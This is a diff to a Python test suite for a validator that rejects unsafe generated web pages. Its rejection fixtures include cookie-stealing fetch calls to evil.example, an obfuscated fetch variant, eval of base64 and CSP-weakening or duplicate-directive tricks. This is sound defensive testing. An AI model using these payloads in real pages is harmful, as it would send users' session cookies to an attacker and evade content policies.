@@ -35,7 +35,7 @@ def check(name, cond, receipt=""):
 
 # the strict allowlist CSP the boundary requires (matches REQUIRED_CSP)
 _CSP = ("default-src 'none'; script-src 'self'; style-src 'self' 'unsafe-inline'; "
-        "img-src 'self' data:; connect-src 'none'; frame-src 'none'; "
+        "img-src 'self' data:; connect-src 'self'; frame-src 'none'; "
         "object-src 'none'; base-uri 'none'; form-action 'none'")
 _CLEAN_HTML = (
     "<!doctype html><html><head><meta charset='utf-8'>"
@@ -44,7 +44,9 @@ _CLEAN_HTML = (
     "<link rel='stylesheet' href='styles.css'><title>T</title></head>"
     "<body><button aria-label='next'>Next</button>"
     "<script src='script.js'></script></body></html>") % _CSP
-_CLEAN_JS = "document.querySelector('button').addEventListener('click', ()=>{});"
+_CLEAN_JS = (
+    "fetch('/api/v1/experiences/exp/progress', {credentials: 'same-origin'});"
+    "document.querySelector('button').addEventListener('click', ()=>{});")
 _CLEAN_CSS = "body{font-family:sans-serif}"
 
 
@@ -69,7 +71,14 @@ def write_site(files: dict) -> Path:
 
 def clean_files(**over):
     f = {"index.html": _CLEAN_HTML, "styles.css": _CLEAN_CSS,
-         "script.js": _CLEAN_JS, "metadata.json": _meta()}
+         "script.js": _CLEAN_JS, "metadata.json": _meta(),
+         "manifest.json": json.dumps({
+             "experience_id": "exp", "job_id": "job", "title": "T",
+             "screen_order": ["screen-1"], "initial_screen_id": "screen-1",
+             "components_used": ["text_screen"], "checkpoint_rules": {}}),
+         "screens/screen-1.json": json.dumps({
+             "id": "screen-1", "title": "Screen 1",
+             "component_type": "text_screen", "content": {"text": "Hello"}})}
     f.update(over)
     return f
 
@@ -90,9 +99,9 @@ def main():
               (not rep["passed"]) and hit,
               receipt="passed=%r violations=%r" % (rep["passed"], rep["violations"]))
 
-    rejects("network fetch()", clean_files(
+    rejects("remote URL literal", clean_files(
         **{"script.js": "fetch('https://evil.example/exfil?d='+document.cookie)"}),
-        "forbidden_fetch")
+        "forbidden_remote_url")
     rejects("eval()", clean_files(**{"script.js": "eval(atob('YWxlcnQoMSk='))"}),
             "forbidden_eval")
     rejects("Function constructor", clean_files(
@@ -131,7 +140,8 @@ def main():
         "no_viewport")
     rejects("missing required file", {"index.html": _CLEAN_HTML,
                                       "styles.css": _CLEAN_CSS,
-                                      "metadata.json": _meta()},  # no script.js
+                                      "metadata.json": _meta(),
+                                      "manifest.json": "{}"},  # no script.js
             "missing_file")
     rejects("metadata missing key", clean_files(
         **{"metadata.json": json.dumps({"job_id": "x"})}),
@@ -148,29 +158,36 @@ def main():
         **{"index.html": _CLEAN_HTML.replace(
             "script-src 'self'", "script-src 'self' 'unsafe-eval'")}), "csp")
     rejects("weak CSP (connect-src *)", clean_files(
-        **{"index.html": _CLEAN_HTML.replace("connect-src 'none'", "connect-src *")}),
+        **{"index.html": _CLEAN_HTML.replace("connect-src 'self'", "connect-src *")}),
         "csp")
     # CSP DESYNC (club 2026-06-14): a duplicate directive that a last-wins parser
     # reads as safe but the browser (first-wins) reads as permissive. parse_csp must
     # match the browser, so the permissive FIRST copy is what's judged -> rejected.
     rejects("CSP desync (duplicate directive, browser first-wins)", clean_files(
         **{"index.html": _CLEAN_HTML.replace(
-            "connect-src 'none'", "connect-src *; connect-src 'none'")}),
+            "connect-src 'self'", "connect-src *; connect-src 'self'")}),
         "csp")
 
-    # -- EVASION: obfuscated fetch BEATS the regex denylist (proving why a denylist
-    # cannot be the boundary). A site with NO strict CSP is rejected anyway — the
-    # boundary is the allowlist. With a strict CSP present, the server CSP header
-    # blocks the egress at runtime (proven in test_public_csp.py).
+    # -- EVASION: obfuscated fetch BEATS the old fetch regex, but the remote URL is
+    # still visible and rejected by the local-only contract. The runtime CSP header
+    # also blocks remote egress at the browser boundary (test_public_csp.py).
     evasive = "window['fet'+'ch']('https://evil.example/x?c='+document.cookie)"
     rep = validate_site(write_site(clean_files(**{"script.js": evasive})))
-    check("EVASION obfuscated fetch SLIPS the regex (documents the denylist gap)",
-          not any(v["check"] == "forbidden_fetch" for v in rep["violations"]),
+    check("EVASION obfuscated fetch remote URL is rejected",
+          any(v["check"] == "forbidden_remote_url" for v in rep["violations"]),
           receipt="violations=%r" % rep["violations"])
     rejects("EVASION obfuscated fetch + NO csp -> rejected by the boundary",
             {"index.html": _CLEAN_HTML.replace(_csp_meta, ""),
              "styles.css": _CLEAN_CSS, "script.js": evasive,
-             "metadata.json": _meta()}, "csp")
+             "metadata.json": _meta(),
+             "manifest.json": clean_files()["manifest.json"],
+             "screens/screen-1.json": clean_files()["screens/screen-1.json"]}, "csp")
+
+    rejects("missing manifest", {k: v for k, v in clean_files().items()
+                                if k != "manifest.json"}, "missing_file")
+    rejects("invalid screen schema", clean_files(
+        **{"screens/screen-1.json": json.dumps({"id": "screen-1"})}),
+        "screen_schema")
 
     # -- DISCRIMINATOR: the clean site still passes (gate isn't reject-everything).
     rep = validate_site(write_site(clean_files()))
